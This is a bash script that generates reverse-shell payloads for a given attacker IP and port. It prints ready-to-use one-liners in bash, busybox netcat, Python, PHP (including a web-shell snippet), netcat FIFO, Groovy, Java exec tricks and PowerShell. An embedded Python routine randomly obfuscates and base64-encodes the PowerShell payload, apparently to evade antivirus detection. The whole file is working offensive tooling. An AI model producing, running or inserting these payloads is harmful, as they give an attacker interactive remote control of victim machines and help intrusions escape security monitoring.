#!/bin/bash

# Print reverse-shell one-liners (bash/python/php/nc/powershell base64)

if [ $# -lt 2 ]; then
    echo -e "\033[0;31mUsage: revshell <ip> <port>\033[0m"
    exit 1
fi

ip="$1"
port="$2"

# Bash reverse shell
bash_shell="/usr/bin/bash  -i  >&  /dev/tcp/$ip/$port  0>&1  "

# Bash Base64 (no wrapping)
shell_encode=$(printf "%s" "$bash_shell" | base64 -w 0)

# PowerShell TCP reverse shell
ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()  "

# Encode PowerShell as UTF-16LE Base64 (single line)
ps_base64=$(printf "%s" "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

# Generate obfuscated PowerShell v2 using embedded Python script
ps_obfuscated=$(python3 - "$ip" "$port" <<'PYTHON_SCRIPT'
import random
import string
import sys
import base64


def rand_var(min_len=4, max_len=20):
    pool = string.ascii_letters + string.digits
    first = random.choice(string.ascii_letters)
    rest = ''.join(random.choices(pool, k=random.randint(min_len - 1, max_len - 1)))
    return first + rest


def shuffled_lookup(target):
    needed = list(dict.fromkeys(target))
    filler_pool = [c for c in string.ascii_letters + string.digits + '-_' if c not in needed]
    random.shuffle(filler_pool)
    pad = filler_pool[:random.randint(30, 55)]
    alphabet = needed + pad
    random.shuffle(alphabet)
    alpha_str = ''.join(alphabet)

    indices = []
    for ch in target:
        positions = [i for i, c in enumerate(alpha_str) if c == ch]
        indices.append(random.choice(positions))

    idx_str = ','.join(map(str, indices))
    return f'("{alpha_str}")[{idx_str}] -join \'\''


def char_arithmetic(s):
    parts = []
    for ch in s:
        v = ord(ch)
        style = random.choice(['mul', 'add'])
        if style == 'mul' and v != 0:
            m = random.randint(2, 127)
            parts.append(f'[char]({m}*{v}/{m})')
        else:
            m = random.randint(0, 100)
            parts.append(f'[char]({m}+{v}-{m})')
    return '+'.join(parts)


def int_array_encode(s):
    ints = ','.join(str(ord(c)) for c in s)
    if random.choice([True, False]):
        inner = (f'([string]::join(\'\', ( ({ints}) '
                 f'|ForEach-Object{{$_}}|%{{ ( [char][int] $_)}}))'
                 f'|ForEach-Object{{$_}}| % {{$_}})')
    else:
        inner = (f'([string]::join(\'\', ( ({ints}) '
                 f'|%{{ ( [char][int] $_)}}))'
                 f'| % {{$_}})')
    return inner


def rand_bufsize():
    styles = ['(65535)', '(0-0+65535)', '(65535+0)', '(65536-1)', '(0x0000+65535)']
    return random.choice(styles)


def rand_foreach():
    opts = ['|ForEach-Object{$_}', '|%{$_}', '|ForEach-Object{$_}|%{$_}']
    return random.choice(opts)


def generate(ip, port):
    v_client = rand_var()
    v_stream = rand_var()
    v_buf = rand_var()
    v_nread = rand_var()
    v_text = rand_var()
    v_result = rand_var()
    v_prompt = rand_var()
    v_outbytes = rand_var()

    new_obj_a = shuffled_lookup('New-Object')
    new_obj_b = shuffled_lookup('New-Object')
    invoke_expr = shuffled_lookup('Invoke-Expression')
    out_str = shuffled_lookup('Out-String')
    get_loc = shuffled_lookup('Get-Location')

    invoke_low = shuffled_lookup('invoke-expression') if random.choice([True, False]) else int_array_encode('invoke-expression')

    tcp_class = char_arithmetic('System.Net.Sockets.TcpClient')

    if random.choice([True, False]):
        ascii_class = f'$({char_arithmetic("System.Text.ASCIIEncoding")})'
    else:
        ascii_class = int_array_encode('System.Text.ASCIIEncoding')

    flush_expr = f'${v_stream}.Flush()' if random.choice([True, False]) else f'({int_array_encode(f"${v_stream}.Flush()")})'

    close_expr = int_array_encode(f'${v_client}.Close()')

    buf_expr = rand_bufsize()

    fe1 = rand_foreach()
    fe2 = rand_foreach()

    if random.choice([True, False]):
        flush_line = f'    (({flush_expr}))'
    else:
        flush_line = f'    $((& ({invoke_low})({int_array_encode(f"${v_stream}.Flush()")}) | % {{$_}})'

    script = (
        f'${v_client} = & ({new_obj_a}) '
        f'$({tcp_class})("{ip}", "{port}");\n'
        f'${v_stream} = (${v_client}.GetStream());'
        f'[byte[]]${v_buf} = 0..$({buf_expr}){fe1}|%{{0}};\n'
        f'while((${v_nread} = ${v_stream}.Read(${v_buf}, 0, ${v_buf}.Length)) -ne 0){{\n'
        f'    ${v_text} = (& ({new_obj_b}) -TypeName '
        f'{ascii_class}).GetString(${v_buf},0, ${v_nread});\n'
        f'    ${v_result} = (& ({invoke_expr}) ${v_text} 2>&1 '
        f'{fe2}| & ({out_str}) );\n'
        f'    ${v_prompt} = ${v_result} + \'PS \' + '
        f'(& ({get_loc})).Path + \'> \';\n'
        f'    ${v_outbytes} = ([text.encoding]::ASCII).GetBytes(${v_prompt});\n'
        f'    ${v_stream}.Write(${v_outbytes},0,${v_outbytes}.Length);\n'
        f'{flush_line}\n'
        f'}};\n'
        f'$((& ({invoke_low})'
        f'({close_expr}) | % {{$_}}));'
    )
    return script


ip = sys.argv[1]
port = sys.argv[2]
payload = generate(ip, port)
encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
print(f'powershell -enc {encoded}')
PYTHON_SCRIPT
)

echo

# URL Encode Command
echo -e "\033[0;33m[+] Command to URL Encode: \033[0;36mjq -nr --arg v \"<COMMAND TO ENCODE>\" '\$v|@uri'\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] busybox: \033[0;32mbusybox nc $ip $port -e /bin/bash\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Java Runtime().exec: \033[0;32mbash -c {echo,$shell_encode}|{base64,-d}|{bash,-i}\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Java Runtime().exec V2: \033[0;32mbash -c \$@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Bash: \033[0;32m$bash_shell\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Bash Encoded: \033[0;32mecho '$shell_encode' | base64 -d | /usr/bin/bash\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Python: \033[0;32mpython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] PHP: \033[0;32mphp -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] PHP simple Revshell: \033[0;32m<?php echo system(\"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196\"); ?>\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Netcat FIFO: \033[0;32mrm -f /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/sh -i 2>&1 | nc $ip $port > /tmp/wk\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] Groovy: \033[0;32mString host=\"$ip\";int port=$port;String cmd=\"sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] PowerShell (Base64): \033[0;32mpowershell -enc $ps_base64\033[0m"
echo "---------------------------------------------"

echo -e "\033[0;33m[+] PowerShell v2 (Obfuscated Base64): \033[0;32m$ps_obfuscated\033[0m"
